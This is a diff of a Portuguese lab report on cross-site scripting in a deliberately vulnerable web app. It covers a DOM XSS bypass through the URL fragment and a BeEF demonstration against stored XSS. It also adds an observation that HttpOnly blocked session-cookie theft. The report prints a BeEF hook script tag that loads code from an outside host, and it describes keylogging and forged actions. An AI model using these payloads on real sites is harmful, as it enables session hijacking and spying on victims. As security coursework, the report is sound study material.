@@ -82,7 +82,7 @@ document.write("<option value='" + lang + "'>" + decodeURI(lang) + "</option>");
 
 O *bypass* High é estrutural: o servidor vê apenas `default=English` (válido na whitelist), mas o JavaScript lê `location.href` inteira, incluindo o fragmento `#` que, por RFC 3986, jamais alcança o servidor — nenhum log/WAF server-side o registra (relação direta com a meta de "explorar sem ser detectado"). **[PRINT 3]**
 
-> **Nota:** alguns navegadores percent-encodam `<`/`>` no fragmento (`%3Cscript%3E`); como o sink usa `decodeURI()` (que não reverte `%3C`), o `alert` pode não disparar — cole a URL diretamente na barra de endereços.
+> **Nota:** mesmo quando o navegador percent-encoda `<`/`>` no fragmento (`%3Cscript%3E`), o `decodeURI()` do sink os reverte para `<`/`>` e o payload executa — confirmado nas capturas. É exatamente por isso que o nível Impossible **remove** o `decodeURI()`.
 
 # Análise de Segurança
 
@@ -93,7 +93,9 @@ Todos os vetores levam ao mesmo resultado: **execução de JavaScript arbitrári
 - **Propagação (worm):** no Stored, o payload persiste e executa para todo visitante, podendo se auto-replicar.
 - **Ações forjadas (XSS + CSRF):** no contexto autenticado, o script lê o próprio token CSRF da página antes de submeter requisições privilegiadas.
 
-A lição transversal é que **blacklists são insuficientes por construção** — caem com variação de caixa, tag alternativa, aninhamento ou event handlers, e são impotentes contra DOM XSS via fragmento. A demonstração de impacto com **BeEF** confirma a gravidade: a partir do Stored Low injeta-se o *hook* (`<script src="http://<IP>:3000/hook.js"></script>`, via `curl` para furar o `maxlength`); o navegador-vítima aparece *hooked* no painel e o módulo *Get Cookies* captura a sessão — viável apenas pela ausência de output encoding, CSP e flag `HttpOnly`.
+A lição transversal é que **blacklists são insuficientes por construção** — caem com variação de caixa, tag alternativa, aninhamento ou event handlers, e são impotentes contra DOM XSS via fragmento. A demonstração de impacto com **BeEF** confirma a gravidade: a partir do Stored Low injeta-se o *hook* (`<script src="http://<IP>:3000/hook.js"></script>`, via `curl` para furar o `maxlength`); o navegador-vítima aparece *hooked* no painel, permitindo executar comandos no contexto da sessão da vítima (leitura de cookies acessíveis, *keylogging*, navegação forjada).
+
+**Observação empírica.** Nas capturas automatizadas, o `alert(document.cookie)` confirmou a execução do script nos **nove cenários**, porém o **`PHPSESSID` não foi exposto**: o servidor o define como `HttpOnly; SameSite=Strict`, tornando-o inacessível ao JavaScript. Isso demonstra, na prática, a eficácia do `HttpOnly` como **defesa em profundidade** — o XSS executa, mas o roubo direto do identificador de sessão via `document.cookie` (ou via *Get Cookies* do BeEF) é bloqueado. O cenário de exfiltração permanece válido para aplicações sem essa proteção; já os demais impactos (*keylogging*, *defacement* e ações forjadas) **independem** da leitura do cookie e seguem viáveis.
 
 **Mitigações**
 
